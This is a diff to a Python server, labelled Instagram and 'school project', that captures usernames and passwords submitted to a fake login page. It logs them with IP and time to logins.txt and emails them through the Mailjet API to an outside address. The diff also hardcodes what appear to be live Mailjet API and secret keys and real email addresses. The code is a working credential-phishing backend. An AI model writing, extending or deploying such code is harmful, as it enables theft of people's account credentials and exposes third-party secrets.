@@ -1,4 +1,4 @@
-# server.py (versión corregida con Mailjet)
+# server.py (con Mailjet + respaldo local en logins.txt)
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 from datetime import datetime
@@ -9,7 +9,7 @@ MAILJET_API_KEY = "26f97d1e712118b2df6b678c218a6cc6"
 MAILJET_SECRET_KEY = "097bc551e192cb74d27ea10aeb5b3cbf"
 
 SENDER_EMAIL = "mexicanonwod@gmail.com"
-SENDER_NAME = "Proyecto Escolar"   # <- agregado
+SENDER_NAME = "Proyecto Escolar"
 RECIPIENT_EMAIL = "isowyvencid@gmail.com"
 
 # --- HANDLER DEL SERVIDOR ---
@@ -29,10 +29,16 @@ class InstagramHandler(BaseHTTPRequestHandler):
 
                 username = data.get('username', '').strip()
                 password = data.get('password', '').strip()
+                ip = self.client_address[0]
+                fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-                # Enviar datos por Mailjet
-                self.send_email_mailjet(username, password)
+                # Guardar en logins.txt
+                self.save_local(username, password, ip, fecha)
 
+                # Enviar por Mailjet
+                self.send_email_mailjet(username, password, ip, fecha)
+
+                # Respuesta al cliente
                 self.send_response(200)
                 self.send_header('Content-type', 'application/json')
                 self.end_headers()
@@ -43,42 +49,48 @@ class InstagramHandler(BaseHTTPRequestHandler):
         else:
             self.send_error(404)
 
-    def send_email_mailjet(self, username, password):
+    def save_local(self, username, password, ip, fecha):
+        """Guardar los datos en un archivo local logins.txt"""
+        try:
+            with open("logins.txt", "a", encoding="utf-8") as f:
+                f.write(f"[{fecha}] IP: {ip} | Usuario: {username} | Contraseña: {password}\n")
+            print("💾 Datos guardados en logins.txt")
+        except Exception as e:
+            print(f"⚠️ Error al guardar en logins.txt: {e}")
+
+    def send_email_mailjet(self, username, password, ip, fecha):
+        """Intentar enviar correo vía Mailjet"""
         url = "https://api.mailjet.com/v3.1/send"
         data = {
             "Messages": [
                 {
-                    "From": {
-                        "Email": SENDER_EMAIL,
-                        "Name": SENDER_NAME
-                    },
-                    "To": [
-                        {
-                            "Email": RECIPIENT_EMAIL,
-                            "Name": "Receptor"
-                        }
-                    ],
+                    "From": {"Email": SENDER_EMAIL, "Name": SENDER_NAME},
+                    "To": [{"Email": RECIPIENT_EMAIL, "Name": "Receptor"}],
                     "Subject": "🚨 Nuevo inicio de sesión (Proyecto Escolar)",
                     "TextPart": f"""
 Usuario: {username}
 Contraseña: {password}
-IP: {self.client_address[0]}
-Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+IP: {ip}
+Fecha: {fecha}
                     """.strip()
                 }
             ]
         }
 
-        response = requests.post(
-            url,
-            json=data,
-            auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY)
-        )
+        try:
+            response = requests.post(
+                url,
+                json=data,
+                auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY)
+            )
+            print("🔎 Respuesta Mailjet:", response.status_code, response.text)
 
-        if response.status_code == 200:
-            print("✅ Correo enviado con Mailjet")
-        else:
-            print(f"❌ Error Mailjet: {response.status_code} - {response.text}")
+            if response.status_code == 200:
+                print("✅ Correo enviado con Mailjet")
+            else:
+                print("❌ Mailjet rechazó el envío")
+        except Exception as e:
+            print(f"⚠️ Error al conectar con Mailjet: {e}")
 
     def send_file(self, filename, content_type):
         try:
